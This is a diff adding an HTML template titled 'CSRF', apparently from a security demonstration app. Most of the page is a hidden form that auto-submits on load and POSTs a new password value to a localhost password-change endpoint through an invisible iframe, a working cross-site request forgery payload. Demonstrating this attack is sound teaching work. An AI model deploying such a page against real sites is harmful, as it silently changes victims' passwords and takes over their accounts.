@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
+    <head>
+        <title>CSRF</title>
+        <link rel="stylesheet" type="text/css" th:href="@{/css/style.css}"/>
+    </head>
+    <body>
+
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form method='POST' action='http://localhost:8080/password' target="csrf-frame" id="csrf-form">
+        <input type='hidden' name='password' value='csrf'></input>
+    </form>
+    <script>document.getElementById("csrf-form").submit()</script>
+    
+    <a href="/logout">Go back</a>
+    
+    </body>
+</html>
